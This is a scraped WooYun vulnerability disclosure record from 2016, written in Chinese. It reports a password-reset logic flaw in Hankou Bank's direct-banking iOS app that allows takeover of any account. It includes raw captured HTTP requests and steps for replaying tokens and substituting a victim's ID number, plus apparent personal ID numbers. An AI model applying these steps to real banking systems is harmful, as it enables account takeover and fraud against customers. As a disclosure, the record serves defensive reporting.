{"id": 86181, "wybug_id": "wooyun-2016-0187309", "wybug_title": "P2P金融安全之汉口银行直销银行任意账户登录", "wybug_corp": "汉口银行", "wybug_author": "咚咚呛", "wybug_date": "2016-03-21 17:30", "wybug_open_date": "2016-05-08 16:25", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["金融小能手"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-08：\t细节向公众公开  简要描述： 此次风险影响汉口银行直销银行的所有账户。 详细说明：  此风险漏洞在ios客户端密码找回功能中，漏洞利用步骤如下：1、首先正常操作密码找回功能，可知其流程如下， 填写自己正确的跟人信息，如：\n\n2、填写正确信息后跳入第二部，输入要篡改的密码，如123abc等，\n\n填写完毕后点击下一步并进行抓包，如图：三个包记录如下：\nPOST /hkzxyh/Timestamp.do HTTP/1.1Host: **.**.**.**Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Content-Type: application/jsonCache-Control: max-age=0Accept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=D38E626DEB05D50C1DA095DB1AA555C8User-Agent: CSII-MOBILE-EBANK IPHONEContent-Length: 53Accept-Encoding: gzipConnection: close{\"LoginType\":\"P\",\"_ChannelId\":\"PMBS\",\"BankId\":\"9999\"}\n\nPOST /hkzxyh/GenToken.do HTTP/1.1Host: **.**.**.**Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Content-Type: application/jsonCache-Control: max-age=0Accept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=D38E626DEB05D50C1DA095DB1AA555C8User-Agent: CSII-MOBILE-EBANK IPHONEContent-Length: 53Accept-Encoding: gzipConnection: close{\"LoginType\":\"P\",\"_ChannelId\":\"PMBS\",\"BankId\":\"9999\"}\n\nPOST /hkzxyh/ResetLoginPwd.do HTTP/1.1Host: **.**.**.**Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Content-Type: application/jsonCache-Control: max-age=0Accept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=D38E626DEB05D50C1DA095DB1AA555C8User-Agent: CSII-MOBILE-EBANK IPHONEContent-Length: 492Accept-Encoding: gzipConnection: close{\"BankId\":\"9999\",\"LoginType\":\"P\",\"IdNo\":\"110000198506144557\",\"ConfirmLoginPassword\":\"W8eA591FHS4xcRu6pjoCRWtiz3rAFUzto2UhmL5J3Hk4PMOv2/+VJ0CSLBDeWg2DPP+s+bFoVjrel77AN+mH3T81HNu3de/LDMCoNDbBljyQhbt6+9oCCL6zfCrQbOpkg9m23Z1Sygyqv9n3xE8o2YdkuEzkWRGUoFABDJt/q8U=\",\"LoginPassword\":\"mrnnpsg7Uwk829qxTkVvs9on5M4wzzQegUpdctcqmdYiXL5FI+ELkvM8Rmb4C3E2qMQpsE1OunkuR+mOGsaUUjaoTGBG2g65RhGXcm685iQS0DglNBha/maHneYFXmQxCVZIvay0ySoeP2N0Re7ps6ohzpdprJ/W0H01YM1QLVw=\",\"_tokenName\":\"6V0Bwi\",\"_ChannelId\":\"PMBS\"}\n\n\n观察最后一个包，关键数据为IdNo及用户号码，尝试把此号码改为被攻击者号码，进行攻击,流程如下1、重放前两个包拿到_tokenName，如图：\n\n\n\n2、获取到的_tokenName和IdNo号码(如身份证：130502199001140612)带入到关键数据包中，如图：\n\n即可篡改成功使用被攻击者身份证登录后如图：\n\n   漏洞证明：  \n\n\n\n\n\n\n\n\n\n\n\n\n\n   修复方案：  建议在短信验证及密码重置的功能页面统一验证，防止分布绕过。   版权声明：转载请注明来源 咚咚呛@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2016-03-24 16:25 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向银行业信息化主管部门通报,并抄报湖北分中心协助处置,由其后续协调网站管理单位处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-21 21:27 |    \t\t千斤拨四两 \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:103        | 是时候表演真正的技术了。。。)\t\t \n  前排围观，连暴3枚，周末闲了啊。。。    \n     2016-03-21 23:27 |    \t\t咚咚呛 \t\t\t( 普通白帽子  |\t\t\t        Rank:263 漏洞数:34        | 我是一只小毛驴咿呀咿呀呦~~)\t\t \n  @千斤拨四两 别这么说，领导看到了会说我偷懒的，都是以前攒的洞    \n     2016-03-25 08:40 |    \t\thamdell \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | Python,Just 兴趣.)\t\t \n  大神，收下我做徒弟吧    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}